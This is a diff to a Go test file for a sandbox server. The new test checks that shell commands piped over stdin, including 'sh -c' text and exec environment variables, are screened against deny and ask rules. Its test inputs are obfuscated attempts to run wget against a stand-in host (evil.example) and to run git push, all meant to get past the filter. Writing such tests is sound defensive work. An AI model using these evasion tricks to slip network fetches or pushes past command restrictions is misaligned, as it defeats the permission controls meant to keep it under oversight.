@@ -430,7 +430,7 @@ func TestStdinShellRefusedForItsOwnStartupVariables(t *testing.T) {
 	} {
 		q := s.r.srv.newStdinScreen(context.Background(), pol, controlplane.Caller{Principal: "alice"}, s.sb, strings.NewReader("echo hi\n"))
 		err := s.r.srv.screenStdinExec(pol, c.command, c.env, q)
-		if !errors.Is(err, controlplane.ErrForbidden) || q.on || !strings.Contains(err.Error(), "reading commands from stdin cannot be checked") {
+		if !errors.Is(err, controlplane.ErrForbidden) || q.on || !strings.Contains(err.Error(), "cannot be checked") {
 			t.Errorf("%s with %q: %v, screened %v", c.command, c.env, err, q.on)
 		}
 	}
@@ -496,6 +496,65 @@ func TestStdinScreenNumbersTheStatementItCutsShort(t *testing.T) {
 			}
 			if ev := waitAudit(t, s.r, s.sb.ID, "exec.refused", controlplane.OutcomeFailed); ev.Detail["n"] != strconv.Itoa(want) {
 				t.Fatalf("the record numbers statement %s, want %d", ev.Detail["n"], want)
+			}
+		})
+	}
+}
+
+// A shell's -c text in a statement is read as a script of its own, and the
+// variables the exec sets are known text, so a program named by either is
+// judged by the rules it would otherwise pass, under the server's rules and
+// a caller's policy layer alike.
+func TestSandboxExecStdinReadsShellCodeAndTheExecsVariables(t *testing.T) {
+	for name, mod := range map[string]func(*Options){
+		"server rules": func(o *Options) {
+			o.Config.Permissions.Deny = []string{"Bash(wget *)"}
+			o.Config.Permissions.Ask = []string{"Bash(git push*)"}
+		},
+		"policy layer": func(o *Options) {
+			o.SessionPolicy = func(context.Context, SessionPolicyRequest) (*PolicyLayer, error) {
+				return &PolicyLayer{Name: "workspace pay", Deny: []string{"bash(wget *)"}, Ask: []string{"bash(git push*)"}}, nil
+			}
+		},
+	} {
+		t.Run(name, func(t *testing.T) {
+			r := newWSRig(t, nil, nil, mod)
+			r.fake.ExecFunc = func(_ context.Context, _ string, req driver.ExecRequest) (driver.ExecResult, error) {
+				_, err := io.Copy(req.Stdout, req.Stdin)
+				return driver.ExecResult{}, err
+			}
+			sb := r.ready(t, "alice")
+			run := func(env []string, script string) streamControl {
+				ws, err := r.dial(t, "alice", "/v1/sandboxes/"+sb.ID+":exec", protoExec)
+				if err != nil {
+					t.Fatal(err)
+				}
+				defer ws.Close()
+				b, _ := json.Marshal(controlplane.ExecRequest{Command: "sh", Env: env})
+				_ = ws.WriteMessage(wsconn.Text, b)
+				if c, _ := control(t, ws); c.Type != "started" {
+					t.Fatalf("%q: %+v", script, c)
+				}
+				_ = ws.WriteMessage(wsconn.Binary, []byte(script))
+				_ = ws.WriteMessage(wsconn.Text, []byte(`{"type":"eof"}`))
+				c, _ := control(t, ws)
+				return c
+			}
+			for _, c := range []struct {
+				env    []string
+				script string
+			}{
+				{nil, "sh -c 'c=wget; $c https://evil.example/x' </dev/null\n"},
+				{nil, "bash -c '$(echo wget) https://evil.example/x' </dev/null\n"},
+				{nil, "sh -ec 'c=git; $c push origin main' </dev/null\n"},
+				{[]string{"W=wget"}, "$W https://evil.example/x </dev/null\n"},
+			} {
+				if got := run(c.env, c.script); got.Type != "error" || got.Error == nil || got.Error.Code != "forbidden" {
+					t.Errorf("%q with %q: %+v", c.script, c.env, got)
+				}
+			}
+			if got := run([]string{"D=/tmp"}, "sh -c 'ls -la \"$D\"' </dev/null\nrm -rf build\n"); got.Type != "exit" {
+				t.Fatalf("a readable script: %+v %+v", got, got.Error)
 			}
 		})
 	}
